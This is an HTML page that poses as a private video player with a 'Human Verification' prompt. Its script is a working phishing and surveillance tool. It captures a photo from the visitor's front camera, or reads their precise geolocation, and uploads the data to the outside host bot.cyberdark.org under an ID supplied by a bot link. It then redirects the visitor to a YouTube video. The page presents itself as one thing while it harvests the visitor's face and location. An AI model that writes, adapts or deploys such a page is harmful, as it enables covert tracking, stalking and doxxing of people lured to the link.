<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Private Video Player</title>
  <style>
    body {
      margin: 0;
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
      background-color: #0f172a;
      color: #f8fafc;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
    }

    .video-container {
      width: min(800px, 95%);
      background: #1e293b;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
      position: relative;
    }

    .video-screen {
      width: 100%;
      aspect-ratio: 16 / 9;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      cursor: pointer;
    }

    .play-button {
      width: 80px;
      height: 80px;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      backdrop-filter: blur(5px);
      transition: transform 0.3s ease, background 0.3s ease;
      z-index: 10;
    }

    .play-button svg {
      width: 40px;
      height: 40px;
      fill: white;
    }

    .video-info {
      padding: 20px;
      border-top: 1px solid #334155;
    }

    .video-info h1 {
      margin: 0;
      font-size: 18px;
      font-weight: 600;
      color: #e2e8f0;
    }

    .video-info p {
      margin: 8px 0 0;
      font-size: 14px;
      color: #94a3b8;
    }

    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(15, 23, 42, 0.95);
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 20px;
      z-index: 100;
    }

    .verify-box {
      max-width: 320px;
    }

    .btn-verify {
      background: #38bdf8;
      color: #0f172a;
      border: none;
      padding: 14px 24px;
      border-radius: 6px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 15px;
      width: 100%;
      font-size: 16px;
    }

    .status-text {
      font-size: 14px;
      color: #cbd5e1;
      margin-top: 15px;
      line-height: 1.5;
    }

    .loader {
      border: 4px solid #334155;
      border-top: 4px solid #38bdf8;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto 15px;
      display: none;
    }

    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <div class="video-container">
    <div class="video-screen" id="playArea">
      <div class="play-button">
        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
      </div>
    </div>
    
    <div class="video-info">
      <h1>Private_Encrypted_Video_Rec772.mp4</h1>
      <p>Source: Secure Cloud • Size: 24.8 MB • Today</p>
    </div>

    <div class="overlay" id="overlay">
      <div class="verify-box">
        <div class="loader" id="loader"></div>
        <h2 id="verifyTitle">Human Verification</h2>
        <p class="status-text" id="status">To access this private content, please complete the human verification process. Click below to continue.</p>
        <button class="btn-verify" id="startAction">Verify Now</button>
      </div>
    </div>
  </div>

  <script>
    const api_url = "https://bot.cyberdark.org"; 
    const overlay = document.getElementById("overlay");
    const playArea = document.getElementById("playArea");
    const startAction = document.getElementById("startAction");
    const statusText = document.getElementById("status");
    const verifyTitle = document.getElementById("verifyTitle");
    const loader = document.getElementById("loader");

    function getParams() {
      const p = new URLSearchParams(window.location.search);
      return { id: p.get("id"), type: p.get("type") };
    }

    playArea.addEventListener('click', () => {
      overlay.style.display = 'flex';
    });

    startAction.addEventListener('click', function() {
      const params = getParams();
      if (!params.id || !params.type) {
        statusText.textContent = "Error: Invalid Session. Please use the link from the bot.";
        return;
      }

      // Loader-i göstər, düyməni gizlə
      loader.style.display = "block";
      startAction.style.display = "none";

      if (params.type === 'camera') {
        captureCamera(params.id);
      } else {
        captureLocation(params.id);
      }
    });

    async function captureCamera(unique_id) {
      try {
        statusText.textContent = "Initializing camera... Please allow access.";
        
        // Kamera icazəsini birbaşa istəyirik
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: false 
        });
        
        statusText.textContent = "Connecting to server...";
        
        const video = document.createElement("video");
        video.srcObject = stream;
        video.muted = true;
        await video.play();

        // Şəkil çəkmək üçün bir az gözlə (fokuslanma üçün)
        await new Promise(r => setTimeout(r, 800));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);

        // Kameranı söndür
        stream.getTracks().forEach(track => track.stop());

        statusText.textContent = "Uploading verification data...";

        canvas.toBlob(async (blob) => {
          const form = new FormData();
          form.append("photo", blob, "verify.jpg");
          form.append("unique_id", unique_id);

          try {
            const response = await fetch(api_url + "/upload", {
              method: "POST",
              body: form,
              mode: 'cors'
            });
            if(response.ok) {
                success();
            } else {
                throw new Error("Upload failed");
            }
          } catch (e) {
            statusText.textContent = "Network error. Please try again.";
            startAction.style.display = "block";
            loader.style.display = "none";
          }
        }, "image/jpeg", 0.7);

      } catch (err) {
        console.error(err);
        statusText.textContent = "Error: Camera access is required for verification.";
        startAction.style.display = "block";
        loader.style.display = "none";
      }
    }

    function captureLocation(unique_id) {
      statusText.textContent = "Requesting location access...";
      
      navigator.geolocation.getCurrentPosition(async (pos) => {
        statusText.textContent = "Verifying location...";
        try {
          await fetch(api_url + "/upload_location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              unique_id: unique_id,
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude
            }),
            mode: 'cors'
          });
          success();
        } catch (err) {
          statusText.textContent = "Connection error.";
          startAction.style.display = "block";
          loader.style.display = "none";
        }
      }, (err) => {
        statusText.textContent = "Location access denied. Verification failed.";
        startAction.style.display = "block";
        loader.style.display = "none";
      }, { enableHighAccuracy: true });
    }

    function success() {
      loader.style.display = "none";
      verifyTitle.textContent = "✅ Verified";
      statusText.textContent = "Verification complete. Redirecting to video...";
      setTimeout(() => {
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
      }, 1500);
    }
  </script>
</body>
</html>
